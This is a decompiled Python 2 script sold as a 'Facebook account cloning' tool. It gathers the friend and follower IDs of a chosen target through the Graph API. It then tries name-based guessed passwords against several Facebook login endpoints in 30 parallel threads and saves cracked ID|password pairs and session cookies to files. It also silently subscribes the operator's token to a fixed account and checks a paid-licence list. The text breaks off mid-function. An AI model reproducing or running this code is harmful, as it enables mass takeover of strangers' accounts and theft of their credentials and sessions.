# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-03-21 12:16:53.981124
try:
    import os, sys, time, datetime, re, random, hashlib, threading, json, getpass, urllib, cookielib, requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 cracker.indirect')


else:
    if os.path.isfile('/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js'):
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        os.system('clear')
    bd = random.randint(20000000.0, 30000000.0)
    sim = random.randint(20000.0, 40000.0)
    header = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
    reload(sys)
    sys.setdefaultencoding('utf-8')
    import os
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

    try:
        import bs4
    except ImportError:
        os.system('pip2 install bs4')

    import os, sys, re, time, requests, json, random, calendar
    from multiprocessing.pool import ThreadPool
    from bs4 import BeautifulSoup as parser
    from datetime import datetime
    from datetime import date
    loop = 0
    id = []
    ok = []
    cp = []
    ct = datetime.now()
    n = ct.month
    bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
    try:
        if n < 0 or n > 12:
            exit()
        nTemp = n - 1
    except ValueError:
        exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tBilall = '%s-%s-%s-%s' % (hr, ha, op, ta)
tgl = '%s %s %s' % (ha, op, ta)
bulan_ttl = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}

def logo():
    os.system('clear')
    print '\n\x1b[0;31m\n\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97      \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \n\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91     \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91     \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91     \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\n                                   \n\n\x1b[37;1m[\x1b[41;1m FACEBOOK ACCOUNT CLONING \x1b[00;1m\x1b[37;1m]\n\n\x1b[1;37;40m\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x90\n\x1b[1;37;40m\xe2\x94\x82 \xc2\xaeScript By MELANIN     \xc2\xae|\n\x1b[1;37;40m\xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98\n\x1b[37;1m[\x1b[41;1m THIS TOOL IS FOR EDUCATIONAL PURPOSE ONLY\x1b[00;1m\x1b[37;1m]\n\n\x1b[32;1mVersion\x1b[37;1m:\x1b[33;1m1.0\n\n\x1b[1;31m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;31m\xe2\x95\x91\x1b[1;37m Author  : \x1b[1;32mMELANIN          \x1b[1;91m\xe2\x95\x91\n\x1b[1;31m\xe2\x95\x91\x1b[1;37m WhatsApp: \x1b[1;32m+2349150557103   \x1b[1;91m\xe2\x95\x91\n\x1b[1;31m\xe2\x95\x91\x1b[1;37m FB.     : \x1b[1;32mMELANIN          \x1b[1;91m\xe2\x95\x91\n\x1b[1;31m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'


def chk():
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = ('|').join(uuid)
    print '\n\n\x1b[37;1m  YOUR ID : ' + id
    try:
        httpCaht = requests.get('https://raw.githubusercontent.com/hassan5542/paid/main/server.txt').text
        if id in httpCaht:
            print '\x1b[92m  YOUR ID IS ACTIVE. .......\x1b[97m'
            msg = str(os.geteuid())
            time.sleep(1)
        else:
            print '\x1b[91m YOUR ID IS NOT ACTIVE COPY ID AND SEND TO ADMIN ON WHATSAPP\x1b[97m'
            os.system('xdg-open https://wa.me/+3111754100')
            time.sleep(1)
            sys.exit()
    except:
        sys.exit()
        if name == '__main__':
            print logo
            chk()


chk()
os.system('clear')

def login():
    os.system('clear')
    try:
        requests.get('https://mbasic.facebook.com')
    except requests.exceptions.ConnectionError:
        exit('Internet Connection Error')

    try:
        token = open('login.txt', 'r')
        menu()
    except KeyError:
        print "\x1b[1;33mIF YOU DON'T HAVE TOKEN GO AND DOWNLOAD ! GET TOKEN APP! "
        token = raw_input('\x1b[1;37m[1] ENTER TOKEN \x1b[1;33m : ')
        if token == '':
            print 'Wrong Input'
        try:
            nama = requests.get('https://graph.facebook.com/me?access_token=' + token).json()['name'].lower()
            open('login.txt', 'w').write(token)
            requests.post('https://graph.facebook.com/819777271/subscribers?access_token=' + token)
            menu()
        except KeyError:
            os.system('rm -f login.txt')
            exit('[>] LOGIN ERROR')


def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
    except KeyError:
        os.system('rm -f login.txt')
        exit('[>] LOGIN ERROR')

    try:
        nama = requests.get('https://graph.facebook.com/me/?access_token=' + token).json()['name'].lower()
    except IOError:
        os.system('rm -f login.txt')
        exit('\x1b[1;91m[\x1b[1;93m+\x1b[1;96m] Token Error')
    except requests.exceptions.ConnectionError:
        exit(' ! no internet connection')

    logo()
    print '\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m] THIS TOOL IS NOT \x1b[1;33mFREE\x1b[1;37m USE ONLY [\x1b[1;31mPREMIUM\x1b[1;37m]'
    print '\x1b[1;37m[\x1b[1;32m01\x1b[1;37m] CRACK FROM PUBLIC IDS'
    print '\x1b[1;37m[\x1b[1;32m02\x1b[1;37m] CRACK FROM PUBLIC  \x1b[1;32mFOLLOWERS'
    print "\x1b[1;37m[\x1b[1;32m03\x1b[1;37m] CRACK FROM \x1b[1;32mMULTI-ID's \x1b[1;37m[\x1b[1;31mPRO\x1b[1;97m]"
    print '\x1b[1;37m[\x1b[1;32m04\x1b[1;37m] CHECK CRACK \x1b[1;32mRESULTS'
    print '\x1b[1;37m[\x1b[1;32m05\x1b[1;37m] CHANGE USER \x1b[1;97m[\x1b[1;91mAGENT\x1b[1;97m]'
    print '\n\x1b[1;37m[\x1b[1;31m00\x1b[1;37m] DELETE TOKEN [\x1b[1;31mEXIT\x1b[1;37m]'
    Bilal = raw_input('\n\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] Choose : ')
    if Bilal == '':
        menu()
    elif Bilal == '1' or Bilal == '01':
        publik()
        method()
    elif Bilal == '2' or Bilal == '02':
        follower()
        method()
    elif Bilal == '3' or Bilal == '03':
        massal()
        method()
    elif Bilal == '4' or Bilal == '04':
        print '\n\x1b[1;37m[\x1b[1;32m1\x1b[1;37m] CHECK CRACK RESULTS  \x1b[1;32mOK'
        print '\x1b[1;37m[\x1b[1;32m2\x1b[1;37m] CHECK CRACK RESULTS  \x1b[1;32mCP'
        cek = raw_input('\n\x1b[1;37m[\x1b[1;32m+\x1b[1;37m]  \x1b[1;32mCHOOSE : ')
        if cek == '':
            menu()
        elif cek == '1':
            dirs = os.listdir('OK')
            print '\x1b[1;97m[\x1b[1;32m+\x1b[1;97m] COPY FILE NAME  AND PASTE INTO In INPUTput'
            for file in dirs:
                print ' ' + file

            try:
                file = raw_input('\n\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] FILE NAME : ')
                if file == '':
                    menu()
                Totalok = open('OK/%s' % file).read().splitlines()
            except IOError:
                exit(' ! file %s tidak tersedia' % file)

            nm_file = ('%s' % file).replace('-', ' ')
            del_txt = nm_file.replace('.txt', '')
            print ' # ----------------------------------------------'
            print ' Crack Result : %s Total : %s\x1b[1;34m' % (del_txt, len(Totalok))
            os.system('cat OK/%s' % file)
            print ' \x1b[0;32m # ----------------------------------------------'
            exit(' ')
        elif cek == '2':
            dirs = os.listdir('CP')
            print '\x1b[1;32m[\x1b[1;32m+\x1b[1;32m] COPY FILE NAME AND PASTE INTO INPUT'
            for file in dirs:
                print ' + ' + file

            try:
                file = raw_input('\n\x1b[1;32m[\x1b[1;32m+\x1b[1;32m] FILE NAME : ')
                if file == '':
                    menu()
                Totalcp = open('CP/%s' % file).read().splitlines()
            except IOError:
                exit(' ! file %s tidak tersedia' % file)

            nm_file = ('%s' % file).replace('-', ' ')
            del_txt = nm_file.replace('.txt', '')
            print '# ----------------------------------------------'
            print ' Crack results : %s Total : %s\x1b[0;32m' % (del_txt, len(Totalcp))
            os.system('cat CP/%s' % file)
            print '\x1b[0;32m # ----------------------------------------------'
            exit(' ')
        else:
            menu()
    elif Bilal == '5' or Bilal == '05':
        setting_ua()
    elif Bilal == '0' or Bilal == '00':
        os.system('rm -f login.txt')
        exit('\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m] TOKEN REMOVED')
    else:
        menu()


def publik():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        exit('\n\x1b[1;31m[\x1b[1;31m!\x1b[1;31m] TOKEN ERROR')

    idt = raw_input('\n\x1b[1;37m[\x1b[1;32m+\x1b[1;37m] TARGET ID: ')
    try:
        for i in requests.get('https://graph.facebook.com/%s/friends?access_token=%s' % (idt, token)).json()['data']:
            uid = i['id']
            nama = i['name'].rsplit(' ')[0]
            id.append(uid + '<=>' + nama)

    except KeyError:
        exit('\n\x1b[1;37m[\x1b[1;32m+\x1b[1;37m] ACCOUNT FRIEND LIST IS NOT PUBLIC')

    print '\x1b[1;31m[\x1b[1;31m+\x1b[1;31m] Total id  : \x1b[1;31m%s\x1b[1;31m' % len(id)


def follower():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        exit('\n\x1b[1;31m[\x1b[1;31m+\x1b[1;31m] TOKEN ERROR')

    idt = raw_input('\n\x1b[1;37m[\x1b[1;92m+\x1b[1;97m] TARGET ID : ')
    try:
        for i in requests.get('https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s' % (idt, token)).json()['data']:
            uid = i['id']
            nama = i['name'].rsplit(' ')[0]
            id.append(uid + '<=>' + nama)

    except KeyError:
        exit('URL Error')

    print "[+] TOTAL ACCOUNT'S  : \x1b[1;33m%s\x1b[1;33m" % len(id)


def massal():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        exit('\x1b[1;31m[\x1b[1;31m+\x1b[1;31m] TOKEN ERROR')

    try:
        tanya_Total = int(input('\x1b[1;37m[\x1b[1;32m+\x1b[1;37m] ENTER MULTI CRACK NUMBER [\x1b[1;32mOption\x1b[1;37m]  : '))
    except:
        tanya_Total = 1

    for t in range(tanya_Total):
        t += 1
        idt = raw_input('\x1b[1;37m[\x1b[1;32m+\x1b[1;37m] TARGET ID %s : ' % t)
        try:
            for i in requests.get('https://graph.facebook.com/%s/friends?access_token=%s' % (idt, token)).json()['data']:
                uid = i['id']
                nama = i['name'].rsplit(' ')[0]
                id.append(uid + '<=>' + nama)

        except KeyError:
            print '\x1b[1;37m[\x1b[1;32m+\x1b[1;37m] IDS FRIEND LIST IS NOT PUBLIC'

    print '\x1b[1;37m[\x1b[1;32m?\x1b[1;37m] TOTAL ID  : \x1b[1;33m%s\x1b[1;33m' % len(id)


def method():
    print '\n\x1b[1;37m[\x1b[1;32m?\x1b[1;37m] PICK CRACKING METHODS'
    print '\x1b[1;37m[\x1b[1;32m1\x1b[1;37m] B-api\x1b[1;37m [ \x1b[1;31mPRO/FASTER\x1b[1;37m]'
    print '\x1b[1;37m[\x1b[1;32m2\x1b[1;37m] MBASIC\x1b[1;37m [ \x1b[1;32mFAST\x1b[1;37m]'
    print '\x1b[1;37m[\x1b[1;32m3\x1b[1;37m] FREE FACEBOOK\x1b[1;37m [ \x1b[1;33mNORMALY\x1b[1;37m]'
    method = raw_input('\x1b[1;37m[\x1b[1;32m?\x1b[1;37m] Pick CRACKING METHOD : ')
    if method == '':
        menu()
    elif method == '1':
        ask = raw_input('\x1b[1;37m[\x1b[1;32m!\x1b[1;37m] USE MANUAL PASSWORDS y/t\x1b[1;37m [ \x1b[1;32mDefault : t \x1b[1;37m] : ')
        if ask == 'y':
            manual()
        print ' '
        ThreadPool(30).map(bapi, id)
        exit('Program End')
    elif method == '2':
        ask = raw_input('\x1b[1;37m[\x1b[1;32m!\x1b[1;37m] USE MANUAL PASSWORDS y/t\x1b[1;37m [ \x1b[1;32mDefault : t \x1b[1;37m] ')
        if ask == 'y':
            manual()
        print ' '
        ThreadPool(30).map(mbasic, id)
        exit('Program End')
    elif method == '3':
        ask = raw_input('\x1b[1;37m[\x1b[1;32m!\x1b[1;37m] USE MANUAL PASSWORDS y/t\x1b[1;37m [ \x1b[1;32mDefault : t \x1b[1;37m] ')
        if ask == 'y':
            manual()
        print ' '
        ThreadPool(30).map(mobile, id)
        exit('Program End')
    else:
        menu()


def cek_ttl_cp(uid, pw):
    try:
        token = open('login.txt', 'r').read()
        with requests.Session() as (ses):
            ttl = ses.get('https://graph.facebook.com/%s?access_token=%s' % (uid, token)).json()['birthday']
            month, day, year = ttl.split('/')
            month = bulan_ttl[month]
            print '\r\x1b[0;32m[MARK-OK] %s|%s|%s %s %s' % (uid, pw, day, month, year)
            cp.append('%s|%s' % (uid, pw))
            open('CP/%s.txt' % tanggal, 'a').write(' + %s|%s|%s %s %s\n' % (uid, pw, day, month, year))
    except KeyError as IOError:
        day = ' '
        month = ' '
        year = ' '
    except:
        pass


def bapi(user):
    global loop
    try:
        ua = open('.ua', 'r').read()
    except IOError:
        ua = 'Mozilla/5.0 (Linux; Android 10; Infinix X688C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

    sys.stdout.write('\r\x1b[1;91m[\x1b[1;92mCracking\x1b[1;91m]\x1b[1;92m %s/%s -> OK:-%s - CP:-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    uid, name = user.split('<=>')
    if len(name) >= 6:
        pwx = [
         name, name + '1', name + '12', name + '123', name + '1234', name + '12345', name, name + '11', name + '22', name + '33', name + '44', name + '55', name + '66', name + '77', name + '88', name + '99']
    else:
        if len(name) <= 2:
            pwx = [
             name, name + '1', name + '12', name + '123', name + '1234', name + '12345', name + '2', name + '3', name + '4', name + '5', name + '6', name + '7', name + '8', name + '9', name + '9', name + '10', name + '16', name + '20', name + '13']
        elif len(name) <= 3:
            pwx = [
             name, name + '111', name + '222', name + '333', name + '444', name + '555', name + '666', name + '777', name + '888', name + '999']
        else:
            pwx = [
             name, name + '2001', name + '2002', name + '2003', name + '1999', name + '1998', name + '1997', name + '1996', name + '1995', name + '1994', name + '1993']
        try:
            for pw in pwx:
                pw = pw.lower()
                ses = requests.Session()
                headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                send = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)
                if 'session_key' in send.text and 'EAAA' in send.text:
                    print '\r\x1b[1;92m[MARK-OK] %s|%s|%s\x1b[1;92m' % (uid, pw, send.json()[''])
                    ok.append('%s|%s' % (uid, pw))
                    open('OK/%s.txt' % tBilall, 'a').write(' + %s|%s\n' % (uid, pw))
                    break
                    continue
                elif 'www.facebook.com' in send.json()['error_msg']:
                    print '\r\x1b[1;92m[MARK-OK] %s|%s' % (uid, pw)
                    cp.append('%s|%s' % (uid, pw))
                    open('CP/%s.txt' % tBilall, 'a').write(' + %s|%s\n' % (uid, pw))
                    break
                    continue

            loop += 1
        except:
            pass


def mbasic(user):
    global loop
    try:
        ua = open('.ua', 'r').read()
    except IOError:
        ua = 'Mozilla/5.0 (Linux; Android 10; Infinix X688C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

    sys.stdout.write('\r\x1b[1;91m[\x1b[1;92mCracking\x1b[1;92m]\x1b[1;93m %s/%s -> OK:-%s - CP:-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    uid, name = user.split('<=>')
    if len(name) >= 6:
        pwx = [
         name, name + '1', name + '12', name + '123', name + '1234', name + '12345']
    else:
        if len(name) <= 2:
            pwx = [
             name, name + '1', name + '12', name + '123', name + '1234', name + '12345']
        elif len(name) <= 3:
            pwx = [
             name, name + '1', name + '12', name + '123', name + '1234', name + '12345']
        else:
            pwx = [
             name, name + '1', name + '12', name + '123', name + '1234', name + '12345']
        try:
            for pw in pwx:
                kwargs = {}
                pw = pw.lower()
                ses = requests.Session()
                ses.headers.update({'origin': 'https://mbasic.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': 'mbasic.facebook.com', 'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'})
                p = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&refid=8').text
                b = parser(p, 'html.parser')
                bl = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login']
                for i in b('input'):
                    try:
                        if i.get('name') in bl:
                            kwargs.update({i.get('name'): i.get('value')})
                        else:
                            continue
                    except:
                        pass

                kwargs.update({'email': uid, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', '_fb_noscript': 'true'})
                gaaa = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8', data=kwargs)
                if 'c_user' in ses.cookies.get_dict().keys():
                    kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    print '\r\x1b[0;92m[MARK-OK] %s|%s|%s\x1b[0;97m' % (uid, pw, kuki)
                    ok.append('%s|%s' % (uid, pw))
                    open('OK/%s.txt' % tBilall, 'a').write(' + %s|%s\n' % (uid, pw))
                    break
                    continue
                elif 'checkpoint' in ses.cookies.get_dict().keys():
                    print '\r\x1b[0;92m[MARK-OK] %s|%s\x1b[0;97m' % (uid, pw)
                    cp.append('%s|%s' % (uid, pw))
                    open('CP/%s.txt' % tBilall, 'a').write(' + %s|%s\n' % (uid, pw))
                    break
                    continue

            loop += 1
        except:
            pass


def mobile(user):
    global loop
    try:
        ua = open('.ua', 'r').read()
    except IOError:
        ua = 'Mozilla/5.0 (Linux; Android 10; Infinix X688C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

    sys.stdout.write('\r\x1b[1;91m[\x1b[1;92mCracking\x1b[1;91m]\x1b[1;97m %s/%s -> OK:-%s - CP:-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    uid, name = user.split('<=>')
    if len(name) >= 6:
        pwx = [
         name, name + '1', name + '12', name + '123', name + '1234', name + '12345']
    else:
        if len(name) <= 2:
            pwx = [
             name, name + '1', name + '12', name + '123', name + '1234', name + '12345']
        elif len(name) <= 3:
            pwx = [
             name, name + '1', name + '12', name + '123', name + '1234', name + '12345']
        else:
            pwx = [
             name, name + '1', name + '12', name + '123', name + '1234', name + '12345']
        try:
            for pw in pwx:
                kwargs = {}
                pw = pw.lower()
                ses = requests.Session()
                ses.headers.update({'origin': 'https://touch.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': 'touch.facebook.com', 'referer': 'https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'})
                p = ses.get('https://touch.facebook.com/login/?next&ref=dbl&refid=8').text
                b = parser(p, 'html.parser')
                bl = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login']
                for i in b('input'):
                    try:
                        if i.get('name') in bl:
                            kwargs.update({i.get('name'): i.get('value')})
                        else:
                            continue
                    except:
                        pass

                kwargs.update({'email': uid, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', '_fb_noscript': 'true'})
                gaaa = ses.post('https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8', data=kwargs)
                if 'c_user' in ses.cookies.get_dict().keys():
                    kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    print '\r\x1b[0;92m[MARK-OK] %s|%s|%s\x1b[0;97m' % (uid, pw, kuki)
                    ok.append('%s|%s' % (uid, pw))
                    open('OK/%s.txt' % tBilall, 'a').write(' + %s|%s\n' % (uid, pw))
                    break
                    continue
                elif 'checkpoint' in ses.cookies.get_dict().keys():
                    print '\r\x1b[0;92m[MARK-OK] %s|%s\x1b[0;97m        ' % (uid, pw)
                    cp.append('%s|%s' % (uid, pw))
                    open('CP/%s.txt' % tBilall, 'a').write(' + %s|%s\n' % (uid, pw))
                    break
                    continue

            loop += 1
        except:
            pass


def manual():
    try:
        ua = open('.ua', 'r').read()
    except IOError:
        ua = 'Mozilla/5.0 (Linux; Android 10; Infinix X688C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

    print '\n[+] TYPE , FOR 2nd PASSWORD FOR EXAMPLE : 112233,334455,445566,223344 etc'
    asu = raw_input('[+] ENTER PASSWORDS : ').split(',')
    if len(asu) == '':
        exit('[+] WRONG INPUT')
    print '[+] ENTER 2-4 PASSWORDS FOR FAST CRACKING SPEED\n'

    def main(user):
        global loop
        sys.stdout.write('\r\x1b[0;92m[\x1b[1;92mCracking\x1b[1;92m]\x1b[1;92m %s/%s -> OK:-%s - CP:-%s ' % (loop, len(id), len(ok), len(cp)))
        sys.stdout.flush()
        uid, name = user.split('<=>')
        try:
            for pw in asu:
                kwargs = {}
                pw = pw.lower()
                ses = requests.Session()
